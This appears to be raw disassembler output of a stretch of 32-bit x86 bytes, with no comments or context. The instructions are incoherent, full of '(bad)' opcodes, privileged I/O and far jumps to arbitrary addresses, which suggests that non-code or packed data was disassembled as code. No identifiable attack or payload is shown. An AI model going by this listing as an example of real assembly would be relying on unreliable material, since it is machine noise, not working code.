  422d39:	jp     0x422d58
  422d3b:	ret    
  422d3c:	pop    esi
  422d3d:	aam    0x6b
  422d3f:	call   0xeaa04a84
  422d44:	adc    DWORD PTR [edi+eax*8+0x4da65fdc],esp
  422d4b:	(bad)  
  422d4c:	mov    WORD PTR [edx-0x2f],cs
  422d4f:	jns    0x422dce
  422d51:	or     al,0x58
  422d53:	pop    esi
  422d54:	aad    0x13
  422d56:	int3   
  422d57:	clc    
  422d58:	jl     0x422d73
  422d5a:	inc    eax
  422d5b:	loopne 0x422d60
  422d5d:	and    edi,esi
  422d5f:	add    al,0x13
  422d61:	popf   
  422d62:	xlat   BYTE PTR ds:[ebx]
  422d63:	aam    0x4b
  422d65:	pop    ss
  422d66:	sub    dl,BYTE PTR es:[ecx-0x24a8c0bc]
  422d6d:	xchg   DWORD PTR [ecx+eiz*8-0x5],eax
  422d71:	fwait
  422d72:	ret    
  422d73:	jae    0x422d31
  422d75:	mov    ds:0x9aeac53a,al
  422d7a:	jnp    0x422d34
  422d7c:	sub    eax,DWORD PTR [ebx+ebp*1+0x4cf11719]
  422d83:	pop    eax
  422d84:	and    eax,0xd800f36c
  422d89:	push   ds
  422d8a:	add    BYTE PTR [ebx],al
  422d8c:	fcom   st(1)
  422d8e:	sub    BYTE PTR [eax],al
  422d90:	fsubr  st(7),st
  422d92:	daa    
  422d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d94:	test   BYTE PTR [esi+edi*8],ah
  422d97:	pop    ds
  422d98:	xlat   BYTE PTR ds:[ebx]
  422d99:	adc    ebx,DWORD PTR [ebx]
  422d9b:	push   0xffffff8c
  422d9d:	and    ah,BYTE PTR [ebp-0x1c3f88a9]
  422da3:	xchg   DWORD PTR [ecx+0x72],eax
  422da6:	pushf  
  422da7:	pop    ebx
  422da8:	lds    eax,FWORD PTR [edx-0x59]
  422dab:	or     eax,DWORD PTR [edi-0x7d]
  422dae:	mov    DWORD PTR [ecx-0x68],eax
  422db1:	and    bh,al
  422db3:	pop    eax
  422db4:	ficomp WORD PTR [edx]
  422db6:	iret   
  422db7:	adc    DWORD PTR [esi+esi*8+0x22],edx
  422dbb:	ret    
  422dbc:	cmp    BYTE PTR ds:0xdb1013cb,dl
  422dc2:	jge    0x422d44
  422dc4:	mov    eax,0xea06a49c
  422dc9:	test   BYTE PTR [ebx-0x455222fc],bh
  422dcf:	into   
  422dd0:	cmp    BYTE PTR [ebx-0x31],ah
  422dd3:	inc    ebx
  422dd4:	jo     0x422df1
  422dd6:	cmp    al,0xc8
  422dd8:	in     al,0xe8
  422dda:	xor    al,0x94
  422ddc:	mov    bh,0x20
  422dde:	(bad)  
  422ddf:	test   eax,0x53156ef8
  422de4:	and    BYTE PTR [esi+0x256e9f16],ah
  422dea:	and    DWORD PTR [esi-0x11179ef7],ebp
  422df0:	call   0xa9a1:0x7ad958fc
  422df7:	cld    
  422df8:	dec    esi
  422df9:	cld    
  422dfa:	xor    BYTE PTR [esi-0x6a],al
  422dfd:	mov    ds:0xb6a07f6e,al
  422e02:	xor    esp,DWORD PTR [ebp+0x315f787e]
  422e08:	add    al,BYTE PTR ds:0x7535f1ac
  422e0e:	cld    
  422e0f:	sbb    al,0x59
  422e11:	stc    
  422e12:	and    cl,al
  422e14:	jg     0x422d9b
  422e16:	lods   al,BYTE PTR ds:[esi]
  422e17:	mov    eax,ds:0x38b20293
  422e1c:	(bad)  
  422e1d:	icebp  
  422e1e:	cs (bad) 
  422e21:	leave  
  422e22:	das    
  422e23:	loope  0x422dbc
  422e25:	out    0x2,al
  422e27:	or     esi,DWORD PTR [edi+0x27120175]
  422e2d:	inc    ebx
  422e2e:	outs   dx,DWORD PTR ds:[esi]
  422e2f:	leave  
  422e30:	aad    0x73
  422e32:	jg     0x422e4b
  422e34:	sbb    BYTE PTR [edi-0x7f],bh
  422e37:	outs   dx,BYTE PTR ds:[esi]
  422e38:	and    BYTE PTR [ebx],dl
  422e3a:	xchg   BYTE PTR [eax],ch
  422e3c:	jmp    0x47dcdb2f
  422e41:	dec    esp
  422e42:	sbb    ecx,DWORD PTR [ebp+0x26]
  422e45:	les    edx,FWORD PTR [ecx]
  422e47:	fldenv [edi+0x287eb1dc]
  422e4d:	retf   0x5314
  422e50:	(bad)  
  422e52:	call   0x8f57b0df
  422e57:	scas   al,BYTE PTR es:[edi]
  422e58:	cmp    DWORD PTR [eax+0x74ba6835],ecx
  422e5e:	push   0xffffffd7
  422e60:	(bad)
  422e63:	enter  0xfd9a,0x21
  422e67:	jp     0x422e8a
  422e69:	mov    ds:0x3d6096af,al
  422e6e:	sbb    ah,ch
  422e70:	enter  0xa5c5,0x36
  422e74:	push   ss
  422e75:	es daa 
  422e77:	loopne 0x422e8a
  422e79:	aad    0x29
  422e7b:	mov    al,bl
  422e7d:	jnp    0x422e22
  422e7f:	data16 aas 
  422e81:	push   esp
  422e82:	push   0x4c
  422e84:	inc    ebp
  422e85:	clc    
  422e86:	jae    0x422ea0
  422e88:	bound  ebp,QWORD PTR [ebx]
  422e8a:	xchg   dh,al
  422e8c:	enter  0xbff5,0xce
  422e90:	mov    esp,0xe0a1daf3
  422e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e96:	out    dx,al
  422e97:	leave  
  422e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e99:	xchg   cl,dl
  422e9b:	xchg   esp,eax
  422e9c:	cmp    esi,DWORD PTR [ebx-0x308119ac]
  422ea2:	push   es
  422ea3:	test   al,0xf
  422ea5:	mov    eax,0x2f4e17d9
  422eaa:	in     al,dx
  422eab:	cmp    esi,edx
  422ead:	jae    0x73430736
  422eb3:	inc    edx
  422eb4:	sbb    ebx,ecx
  422eb6:	add    eax,0x4d9a5ce2
  422ebb:	or     ch,dl
  422ebd:	mov    dl,0x57
  422ebf:	vrcpss xmm6,xmm7,xmm5
  422ec3:	xchg   ecx,eax
  422ec4:	iret   
  422ec5:	lods   al,BYTE PTR ds:[esi]
  422ec6:	jge    0x422e9e
  422ec8:	dec    esp
  422ec9:	popf   
  422eca:	jmp    0x42cb:0x9bbf0efc
  422ed1:	sub    eax,0x6d6ad8bb
  422ed6:	push   esi
  422ed7:	jmp    0x22d8:0xb23ac3cc
  422ede:	xchg   esi,eax
  422edf:	retf   0x2e72
  422ee2:	loope  0x422e85
  422ee4:	js     0x422f55
  422ee6:	mov    edx,0x7395aaab
  422eeb:	icebp  
  422eec:	mov    eax,ds:0x959a2ba6
  422ef1:	xchg   ecx,eax
  422ef2:	out    0x33,al
  422ef4:	clc    
  422ef5:	mov    ebp,?
  422ef7:	mov    edi,ebp
  422ef9:	jmp    0x9aff:0x4495f422
  422f00:	loopne 0x422f15
  422f02:	test   ah,ch
  422f04:	mov    bh,0x29
  422f06:	or     eax,DWORD PTR [esi+0x315e41d8]
  422f0c:	(bad)  
  422f0d:	or     dh,bl
  422f0f:	neg    BYTE PTR [eax-0x59f23f9c]
  422f15:	repnz nop
  422f17:	stc    
  422f18:	aaa    
  422f19:	cmp    eax,0xf8160c70
  422f1e:	cdq    
  422f1f:	xor    al,bh
  422f21:	add    al,0xf
  422f23:	test   al,0x10
  422f25:	in     al,0xfa
  422f27:	out    dx,al
  422f28:	cld    
  422f29:	test   al,0x26
  422f2b:	sub    DWORD PTR [esi+0x3ef89249],ebp
  422f31:	jp     0x422f68
  422f33:	mov    edi,0x55c9d4c3
  422f38:	mov    ebp,0xbbfdba3d
  422f3d:	bnd jb 0x422f2a
  422f40:	and    eax,0xf6fd58c9
  422f45:	or     edi,DWORD PTR [edx]
  422f47:	adc    edx,DWORD PTR [ebx]
  422f49:	dec    esi
  422f4a:	aas    
  422f4b:	and    esi,0xa949e259
  422f51:	leave  
  422f52:	mov    ecx,0x2e60a2f5
  422f57:	mul    ebp
  422f59:	iret   
  422f5a:	ret    0x5838
  422f5d:	adc    al,0x37
  422f5f:	shl    BYTE PTR [edx+0x6b],cl
  422f62:	inc    ebx
  422f63:	inc    edi
  422f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f65:	jl     0x422faa
  422f67:	push   esi
  422f68:	outs   dx,DWORD PTR ds:[esi]
  422f69:	outs   dx,DWORD PTR ds:[esi]
  422f6a:	cmc    
  422f6b:	push   0x310025b
  422f70:	dec    eax
  422f71:	icebp  
  422f72:	imul   esi,DWORD PTR [esi-0x29],0xd0247c5f
  422f79:	pop    eax
  422f7a:	xlat   BYTE PTR ds:[ebx]
  422f7b:	push   cs
  422f7c:	in     eax,dx
  422f7d:	pop    ebx
  422f7e:	scas   eax,DWORD PTR es:[edi]
  422f7f:	fist   WORD PTR [esi+0x585b384a]
  422f85:	mov    ebx,0xae971c
  422f8a:	xchg   edx,eax
  422f8b:	push   esp
  422f8c:	dec    esi
  422f8d:	arpl   WORD PTR [eax],bx
  422f8f:	or     dh,bl
  422f91:	inc    ebp
  422f92:	or     cl,BYTE PTR [ebp-0x560517de]
  422f98:	cmp    al,0xb0
  422f9a:	mov    eax,ds:0x6fabe0aa
  422f9f:	addr16 jge 0x422f82
  422fa2:	sbb    bl,ah
  422fa4:	pop    edi
  422fa5:	test   DWORD PTR [esp+esi*1],esp
  422fa8:	imul   ecx,DWORD PTR [esi-0x49440a2f],0x2190c202
  422fb2:	inc    edx
  422fb3:	call   0xa1f:0xe4d0b284
  422fba:	cld    
  422fbb:	(bad)
  422fc0:	iret   
  422fc1:	sub    ah,bl
  422fc3:	mov    dl,cl
  422fc5:	push   ebx
  422fc6:	sbb    ecx,ecx
  422fc8:	leave  
  422fc9:	mov    edi,0x48ec6024
  422fce:	lods   al,BYTE PTR ds:[esi]
  422fcf:	dec    edx
  422fd0:	push   cs
  422fd1:	aam    0x5b
  422fd3:	xchg   esp,eax
  422fd4:	call   0x654d21a7
  422fd9:	adc    edx,DWORD PTR [edi]
  422fdb:	jns    0x422f84
  422fdd:	icebp  
  422fde:	add    bl,BYTE PTR [esi+0x5a]
  422fe1:	xchg   edi,eax
  422fe2:	mov    cl,0x33
  422fe4:	pop    ebx
  422fe5:	push   ss
  422fe6:	xor    ch,BYTE PTR [edi+0x7c]
  422fe9:	xchg   ebx,eax
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x423044
  422ff7:	add    BYTE PTR [ecx],dl
  422ff9:	mov    ebx,0x1bea0
  422ffe:	mov    BYTE PTR [esi],al
  423000:	add    BYTE PTR [eax],al
  423002:	test   BYTE PTR [edx+0x41],bl
  423005:	mov    es:0x7110ecd2,eax
  42300b:	nop
  42300c:	loop   0x422f8f
  42300e:	sub    ah,BYTE PTR [esi-0x40]
  423011:	sub    al,0xbf
  423013:	scas   eax,DWORD PTR es:[edi]
  423014:	adc    ebx,0x217da8de
  42301a:	push   eax
  42301b:	inc    ebx
  42301c:	jnp    0x423077
  42301e:	xlat   BYTE PTR ds:[ebx]
  42301f:	ins    BYTE PTR es:[edi],dx
  423020:	cdq    
  423021:	or     dh,BYTE PTR [edi+ecx*1-0x3bde612e]
  423028:	jl     0x422fb7
  42302a:	fistp  QWORD PTR [ebp+esi*4+0x51ab417b]
  423031:	shl    BYTE PTR [edx+edx*2+0x61],0x2e
  423036:	mov    ch,0x5a
  423038:	sti    
  423039:	sbb    DWORD PTR [edx-0xbb089b6],ecx
  42303f:	xchg   ecx,eax
  423040:	call   0xc8ec:0x1a457743
  423047:	pop    eax
  423048:	xor    al,0x53
  42304a:	fisubr DWORD PTR [edi-0x45]
  42304d:	dec    eax
  42304e:	scas   al,BYTE PTR es:[edi]
  42304f:	mov    esp,0xd5d93efd
  423054:	(bad)  
  423055:	cli    
  423056:	inc    eax
  423057:	imul   esi,DWORD PTR [ecx+0x63bbed23],0xffffffb1
  42305e:	ss jno 0x4230db
  423061:	push   es
  423062:	adc    BYTE PTR [edx+edx*4],ch
  423065:	xchg   ebx,eax
  423066:	sbb    al,0xfc
  423068:	mov    esi,0xdf956250
  42306d:	and    ebp,DWORD PTR [esi+0x32ac92fb]
  423073:	iret   
  423074:	add    cl,dh
  423076:	pop    ebx
  423077:	(bad)  
  423078:	sti    
  423079:	mov    dl,BYTE PTR [edx-0x7]
  42307c:	add    al,0xab
  42307e:	icebp  
  42307f:	xor    al,0x19
  423081:	inc    esp
  423082:	das    
  423083:	ss mov ch,0xa4
  423086:	xor    ecx,DWORD PTR [edi+0x77b3d668]
  42308c:	aam    0xa8
  42308e:	push   cs
  42308f:	div    BYTE PTR [ebx-0x1cc16ddc]
  423095:	mov    ecx,0xc391f987
  42309a:	fcomi  st,st(3)
  42309c:	inc    ebx
  42309d:	lods   al,BYTE PTR ds:[esi]
  42309e:	(bad)  
  42309f:	mov    al,0x87
  4230a1:	mov    cl,0xdc
  4230a3:	jbe    0x42311c
  4230a5:	push   ss
  4230a6:	(bad)  
  4230a7:	fsub   st(1),st
  4230a9:	retf   
  4230aa:	jge    0x423113
  4230ac:	test   DWORD PTR [esi+0x48],0xe3f880fd
  4230b3:	jo     0x4230ab
  4230b5:	ss dec esi
  4230b7:	stos   DWORD PTR es:[edi],eax
  4230b8:	test   eax,0x19024f8c
  4230bd:	in     al,0xbb
  4230bf:	cwde   
  4230c0:	push   eax
  4230c1:	dec    edi
  4230c2:	pop    ebx
  4230c3:	out    0x72,al
  4230c5:	xchg   ebx,eax
  4230c6:	rol    ebp,cl
  4230c8:	cli    
  4230c9:	pushf  
  4230ca:	dec    ecx
  4230cb:	imul   edi,DWORD PTR [ecx+ecx*4],0xffffffc4
  4230cf:	add    DWORD PTR [edi+0x63],edi
  4230d2:	and    al,BYTE PTR [eax]
  4230d4:	(bad)  
  4230d5:	js     0x4230c9
  4230d7:	(bad)  
  4230d8:	dec    DWORD PTR [edx]
  4230da:	push   esi
  4230db:	scas   eax,DWORD PTR es:[edi]
  4230dc:	je     0x4230b7
  4230de:	inc    ecx
  4230df:	cmp    ah,bl
  4230e1:	shl    DWORD PTR [edi+0x29677481],cl
  4230e7:	ss inc ecx
  4230e9:	cld    
  4230ea:	in     eax,dx
  4230eb:	jb     0x4230f5
  4230ed:	stc    
  4230ee:	sar    dl,cl
  4230f0:	popa   
  4230f1:	clc    
  4230f2:	fs adc dh,dl
  4230f5:	or     ebp,DWORD PTR [ecx+ebx*1]
  4230f8:	call   DWORD PTR [edi]
  4230fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230fb:	adc    al,0x4d
  4230fd:	test   DWORD PTR [ebx],0x801d2e07
  423103:	call   0x9d75601
  423108:	in     eax,dx
  423109:	call   0xea0f:0xb095d0af
  423110:	cmp    DWORD PTR ds:0x5f44ba14,edi
  423116:	xchg   ebp,eax
  423117:	repz gs cwde 
  42311a:	hlt    
  42311b:	outs   dx,DWORD PTR ds:[esi]
  42311c:	or     ecx,eax
  42311e:	add    al,0x9
  423120:	cs cli 
  423122:	data16 fld DWORD PTR [ecx]
  423125:	ficomp DWORD PTR [ebx+0x3a1141b7]
  42312b:	mov    bh,BYTE PTR [ebx]
  42312d:	sbb    al,BYTE PTR [ebp-0x5aee47c7]
  423133:	ds repz pop edx
  423136:	shl    DWORD PTR [ecx],1
  423138:	pop    ebp
  423139:	adc    BYTE PTR [ecx],ah
  42313b:	jp     0x423129
  42313d:	pop    eax
  42313e:	ss hlt 
  423140:	mov    ah,0x1a
  423142:	sbb    al,0x39
  423144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423145:	mov    ebx,0x88af3636
  42314a:	sbb    esp,DWORD PTR [ebx+ebp*2+0x65]
  42314e:	ja     0x42316b
  423150:	inc    edi
  423151:	outs   dx,BYTE PTR ds:[esi]
  423152:	pop    ecx
  423153:	(bad)  
  423155:	and    BYTE PTR [esi-0x9],bl
  423158:	jmp    0x42318b
  42315a:	dec    ecx
  42315b:	pop    esp
  42315c:	push   ss
  42315d:	aaa    
  42315e:	out    0x5f,al
  423160:	or     al,al
  423162:	sub    eax,0x4e58cc00
  423167:	pop    edi
  423168:	int    0x5c
  42316a:	xchg   edi,eax
  42316b:	add    DWORD PTR [eax+0x29b6dd59],edi
  423171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423172:	lahf   
  423173:	and    eax,0x8f72518e
  423178:	push   esp
  423179:	fidiv  DWORD PTR [esi+0x20]
  42317c:	out    dx,eax
  42317d:	test   eax,0xd8d51f5b
  423182:	out    dx,al
  423183:	mov    eax,ds:0x879df491
  423188:	mov    edi,0x13fafe56
  42318d:	mov    BYTE PTR [ecx-0x4c23f628],cl
  423193:	lods   al,BYTE PTR ds:[esi]
  423194:	sti    
  423195:	mov    al,ds:0x87d29f5a
  42319a:	xor    edi,0x19
  42319d:	xor    al,0x2b
  42319f:	psubsw mm0,QWORD PTR fs:[eax]
  4231a3:	xchg   esp,eax
  4231a4:	sub    esp,ebx
  4231a6:	jmp    0xa28e:0xfd453ec1
  4231ad:	and    BYTE PTR [eax],al
  4231af:	jge    0x423143
  4231b1:	jmp    0x522aaf2
  4231b6:	test   BYTE PTR [edx+ebx*1-0x6878f175],cl
  4231bd:	sub    edx,esp
  4231bf:	in     al,dx
  4231c0:	scas   eax,DWORD PTR es:[edi]
  4231c1:	les    esi,FWORD PTR [edx+0x45]
  4231c4:	cdq    
  4231c5:	fnstcw WORD PTR ss:[eax+0x2d]
  4231c9:	std    
  4231ca:	mov    esi,0x8e28af5c
  4231cf:	cmp    ah,BYTE PTR [esi+0x2d37e898]
  4231d5:	cwde   
  4231d6:	fs out 0xae,al
  4231d9:	cmp    BYTE PTR [ebp+ecx*1+0x346028e3],cl
  4231e0:	popf   
  4231e1:	jbe    0x423209
  4231e3:	dec    ecx
  4231e4:	mov    ds:0x5e8f9725,al
  4231e9:	sub    bl,BYTE PTR [esi+0x1254a770]
  4231ef:	jb     0x4231f7
  4231f1:	aad    0x6e
  4231f3:	retf   0xd0b6
  4231f6:	fidiv  WORD PTR [ecx+ebx*1]
  4231f9:	lahf   
  4231fa:	imul   esi,ecx,0x48920eeb
  423200:	sub    al,0xe6
  423202:	cs cmc 
  423204:	xor    DWORD PTR [eax-0xb],edx
  423207:	jo     0x4231a6
  423209:	pmullw mm0,mm0
  42320c:	loop   0x42328c
  42320e:	out    dx,eax
  42320f:	xor    DWORD PTR [ecx-0x3b978ea4],0x4df1c054
  423219:	stos   DWORD PTR es:[edi],eax
  42321a:	sub    ebp,DWORD PTR [ebp+0x2e2b4969]
  423220:	cmp    dh,BYTE PTR [eax+0x31]
  423223:	dec    ebp
  423224:	fadd   DWORD PTR [esi+0x16b6f592]
  42322a:	mov    ds:0x2e89e370,eax
  42322f:	xchg   esi,eax
  423230:	rcl    BYTE PTR [eax+esi*1],0x9d
  423234:	es popa 
  423236:	ss push eax
  423238:	xlat   BYTE PTR ds:[ebx]
  423239:	stos   DWORD PTR es:[edi],eax
  42323a:	pop    ss
  42323b:	cwde   
  42323c:	mov    ah,0x74
  42323e:	inc    ebp
  42323f:	and    eax,0xf2fe3136
  423244:	icebp  
  423245:	pop    esi
  423246:	sahf   
  423247:	xor    al,0x99
  423249:	jl     0x4231d7
  42324b:	scas   al,BYTE PTR es:[edi]
  42324c:	mov    edi,0x81d2e86c
  423251:	adc    BYTE PTR fs:[edx],cl
  423254:	dec    edi
  423255:	push   0x2
  423257:	mov    edi,0x12ee2b96
  42325c:	out    0x93,al
  42325e:	and    DWORD PTR [edx+0x711904ec],edi
  423264:	or     BYTE PTR [ecx*4+0xfcf5a0c],ah
  42326b:	inc    esi
  42326c:	mov    BYTE PTR [esi-0x65ba3a02],ah
  423272:	mov    ds:0xf2b8a146,al
  423277:	aaa    
  423278:	rol    ebp,cl
  42327a:	(bad)  
  42327b:	loop   0x42323d
  42327d:	outs   dx,DWORD PTR ds:[esi]
  42327e:	retf   0x4242
  423281:	lahf   
  423282:	sti    
  423283:	(bad)  
  423284:	cmp    DWORD PTR [ecx],edi
  423286:	rcl    DWORD PTR [edx+0xc49134],0x5
  42328d:	(bad)  
  42328e:	cli    
  42328f:	aaa    
  423290:	iret   
  423291:	je     0x4232c5
  423293:	fsubr  DWORD PTR [ecx-0x2d7bc8c2]
  423299:	jnp    0x423292
  42329b:	sbb    edx,ebp
  42329d:	sub    DWORD PTR [ebx+0xd],edi
  4232a0:	inc    eax
  4232a1:	sub    eax,0xd828231d
  4232a6:	dec    eax
  4232a7:	xchg   esp,eax
  4232a8:	cs xchg ebp,eax
  4232aa:	sahf   
  4232ab:	pusha  
  4232ac:	or     ch,BYTE PTR [edx]
  4232ae:	out    dx,eax
  4232af:	add    dl,cl
  4232b1:	es push esi
  4232b3:	mov    ch,0xfc
  4232b5:	sub    al,0x2a
  4232b7:	mov    bl,0x1
  4232b9:	mov    al,ds:0xf7911363
  4232be:	mov    bl,0x22
  4232c0:	retf   
  4232c1:	xor    BYTE PTR [edi-0x76],dh
  4232c4:	add    BYTE PTR [edx],0x94
  4232c7:	dec    eax
  4232c8:	inc    ecx
  4232c9:	inc    eax
  4232ca:	div    ecx
  4232cc:	es push ss
  4232ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232cf:	bound  edi,QWORD PTR ds:0x3b748b3a
  4232d5:	pop    edx
  4232d6:	sbb    ebp,DWORD PTR [eax-0x2a]
  4232d9:	adc    eax,0xc101da5e
  4232de:	scas   al,BYTE PTR es:[edi]
  4232df:	idiv   BYTE PTR [edi]
  4232e1:	xchg   edx,eax
  4232e2:	push   edi
  4232e3:	add    eax,0x4d22ad17
  4232e8:	sub    bh,al
  4232ea:	outs   dx,DWORD PTR ds:[esi]
  4232eb:	clc    
  4232ec:	mov    ch,BYTE PTR [edi]
  4232ee:	pop    ss
  4232ef:	mov    bh,0xa2
  4232f1:	(bad)  
  4232f2:	in     eax,0x5
  4232f4:	cmp    eax,0xacee459
  4232f9:	or     eax,DWORD PTR [ebp+0x1760f4b8]
  4232ff:	dec    esi
  423300:	xchg   esi,eax
  423301:	in     al,dx
  423302:	repnz adc BYTE PTR [edx+0x4e],dh
  423306:	lmsw   WORD PTR [edx+edi*1-0x41db582e]
  42330e:	jg     0x423343
  423310:	hlt    
  423311:	xchg   ebx,eax
  423312:	pop    ebp
  423313:	mov    esi,0x36652bbe
  423318:	jmp    0x831d:0x1b6620c
  42331f:	fnsave [esi+0x43]
  423322:	mov    esi,0xe3aa1fd8
  423327:	aas    
  423328:	jno    0x423319
  42332a:	add    al,0x42
  42332c:	add    dh,BYTE PTR [esi+0x2ae1f4b1]
  423332:	popa   
  423333:	je     0x42337f
  423335:	js     0x4232f0
  423337:	sub    esi,ecx
  423339:	mov    esi,0xe92b4807
  42333e:	mov    eax,ds:0x8f929b96
  423343:	fisttp QWORD PTR [ecx-0x1977a80f]
  423349:	sbb    al,0xca
  42334b:	sbb    BYTE PTR [edi+0x686bb216],0x6b
  423352:	xchg   ebp,eax
  423353:	mov    al,0x6b
  423355:	push   edi
  423356:	rcr    ebp,0xe3
  423359:	pushf  
  42335a:	enter  0x5d3a,0x26
  42335e:	loopne 0x42335d
  423360:	sub    ch,BYTE PTR [esi]
  423362:	cs stos DWORD PTR es:[edi],eax
  423364:	je     0x4233ce
  423366:	sbb    BYTE PTR [edx-0x6a],cl
  423369:	les    esp,FWORD PTR [eax-0x55]
  42336c:	push   es
  42336d:	mov    ebx,0xd609a1f6
  423372:	mov    DWORD PTR [eax],esp
  423374:	add    eax,0x7483c3eb
  423379:	mov    esp,DWORD PTR [edi-0x61]
  42337c:	adc    eax,0x710f07bc
  423381:	xchg   DWORD PTR [esi],edi
  423383:	xor    al,0x80
  423385:	cmp    esi,DWORD PTR ds:0x79e8797d
  42338b:	aaa    
  42338c:	push   0x37
  42338e:	push   es
  42338f:	cmp    ecx,eax
  423391:	push   eax
  423392:	pop    eax
  423393:	(bad)  [edi-0x7d3c4cf7]
  423399:	or     eax,0x5c6b7aea
  42339e:	pop    eax
  42339f:	fwait
  4233a0:	xor    edi,0x3a
  4233a3:	mov    ds:0xd45f1b40,al
  4233a8:	push   ecx
  4233a9:	mov    ds:0xdb15880a,al
  4233ae:	add    BYTE PTR [ecx-0x1d755a51],cl
  4233b4:	ss repnz xchg eax,ebx
  4233b8:	push   0xf
  4233ba:	xor    al,0x87
  4233bc:	inc    ah
  4233be:	add    DWORD PTR [ebx+0x38],0x8408b620
  4233c5:	jne    0x42339e
  4233c7:	mov    eax,0x8c730f4b
  4233cc:	imul   esi,esi,0x3f88f4f8
  4233d2:	scas   eax,DWORD PTR es:[edi]
  4233d3:	mov    esp,0x89c2387b
  4233d8:	inc    ebp
  4233d9:	ja     0x423391
  4233db:	out    dx,eax
  4233dc:	fimul  WORD PTR [esi+0x416e624f]
  4233e2:	in     eax,dx
  4233e3:	(bad)  
  4233e4:	push   edi
  4233e5:	mov    fs,ecx
  4233e7:	xor    BYTE PTR [ecx+0x25],ch
  4233ea:	ret    0xb2d0
  4233ed:	jmp    0x4233e8
  4233ef:	inc    ebp
  4233f0:	pop    es
  4233f1:	sbb    esi,DWORD PTR [ebp+0x4fb11de7]
  4233f7:	sub    eax,0xf2a62b57
  4233fc:	(bad)  
  4233fd:	adc    cl,BYTE PTR [ecx+eiz*1+0x70827770]
  423404:	xchg   esp,eax
  423405:	mov    edi,0x35686382
  42340a:	addr16 jge 0x4233df
  42340d:	lea    edi,[ebp+0x4d]
  423410:	add    ecx,DWORD PTR ds:0xa0be0fff
  423416:	ins    BYTE PTR es:[edi],dx
  423417:	loopne 0x42348c
  423419:	arpl   di,bx
  42341b:	and    BYTE PTR [ecx-0x65],al
  42341e:	fadd   QWORD PTR [edi+0x40]
  423421:	into   
  423422:	fimul  DWORD PTR [edi-0x2]
  423425:	dec    edi
  423426:	mov    esi,0x7a6edacd
  42342b:	pop    es
  42342c:	mov    edi,0xd70dc707
  423431:	mov    edx,0x6e685cac
  423436:	jmp    0x4233d2
  423438:	lods   al,BYTE PTR ds:[esi]
  423439:	daa    
  42343a:	dec    edi
  42343b:	in     al,dx
  42343c:	ins    DWORD PTR es:[edi],dx
  42343d:	sar    BYTE PTR [edx+0x1e789cab],1
  423443:	dec    ecx
  423444:	rcl    BYTE PTR [edx-0x1c],1
  423447:	stos   DWORD PTR es:[edi],eax
  423448:	je     0x4234a8
  42344a:	cld    
  42344b:	rol    DWORD PTR [eax+0x11d03c18],0xa4
  423452:	mov    ecx,DWORD PTR [ecx]
  423454:	ins    BYTE PTR es:[edi],dx
  423455:	cmp    cl,bl
  423457:	mov    ch,0xa3
  423459:	jmp    0x4234d2
  42345b:	dec    ecx
  42345c:	mov    eax,ebx
  42345e:	retf   
  42345f:	data16 mov bh,0xc
  423462:	retf   0x16a0
  423465:	sbb    eax,0xdc84ca1b
  42346a:	fwait
  42346b:	cli    
  42346c:	aaa    
  42346d:	add    BYTE PTR [edx+0x7234db41],al
  423473:	mov    ds:0x22418b8e,al
  423478:	lea    edx,[eax+0x41]
  42347b:	je     0x423460
  42347d:	frstor [ebp+0x4b]
  423480:	pop    esi
  423481:	push   0xef9d973e
  423486:	es fwait
  423488:	repz mov al,ds:0xf91e6b59
  42348e:	xchg   ecx,eax
  42348f:	push   ebx
  423490:	adc    eax,0x52fa8468
  423495:	dec    ecx
  423496:	push   ebx
  423497:	mov    edi,DWORD PTR [eax+ecx*2-0x4b7437a8]
  42349e:	push   esi
  42349f:	(bad)  
  4234a1:	mov    al,0xb
  4234a3:	push   ebx
  4234a4:	sub    bl,BYTE PTR ss:[ebx]
  4234a7:	add    eax,edi
  4234a9:	fisttp DWORD PTR [edx]
  4234ab:	xlat   BYTE PTR ds:[ebx]
  4234ac:	mov    dh,BYTE PTR [eax+ebp*8-0x17e26cca]
  4234b3:	inc    eax
  4234b4:	sbb    DWORD PTR [edx],edi
  4234b6:	or     BYTE PTR [ebx],al
  4234b8:	addr16 sti 
  4234ba:	xor    edi,ebx
  4234bc:	in     al,dx
  4234bd:	mov    ch,0x15
  4234bf:	idiv   ebp
  4234c1:	jns    0x4234c2
  4234c3:	sbb    DWORD PTR [edx],ecx
  4234c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234c6:	push   ecx
  4234c7:	xor    eax,0xefdd9f6d
  4234cc:	mov    ds:0x4cbeb21d,al
  4234d1:	dec    ebx
  4234d2:	and    al,0x6
  4234d4:	dec    edi
  4234d5:	loop   0x423535
  4234d7:	ds shl eax,1
  4234da:	push   es
  4234db:	loope  0x42351a
  4234dd:	idiv   DWORD PTR [eax]
  4234df:	cmp    dl,BYTE PTR [esi-0x6d]
  4234e2:	or     eax,0x7027da8d
  4234e7:	ret    0x9cfc
  4234ea:	xchg   ebx,eax
  4234eb:	shl    DWORD PTR [ebp-0x4d126eff],0x34
  4234f2:	test   DWORD PTR [esi-0xb7b8067],ecx
  4234f8:	aad    0xae
  4234fa:	vunpckhpd xmm3,xmm6,xmm3
  4234fe:	rol    DWORD PTR [eax+0x5e],cl
  423501:	cmp    DWORD PTR [ecx+ebx*2],ecx
  423504:	or     ah,BYTE PTR [edi+0x6b]
  423507:	and    eax,0x3c99ec25
  42350c:	lds    ebp,FWORD PTR [edi-0x21]
  42350f:	xchg   DWORD PTR ds:0x1c127ae,edx
  423515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423516:	aaa    
  423517:	je     0x4234c9
  423519:	mov    eax,DWORD PTR [eax]
  42351b:	inc    ebx
  42351c:	inc    ecx
  42351d:	inc    ecx
  42351e:	bnd jbe 0x4234bf
  423521:	jno    0x423528
  423523:	jp     0x423506
  423525:	xchg   esp,eax
  423526:	mov    dh,0xa4
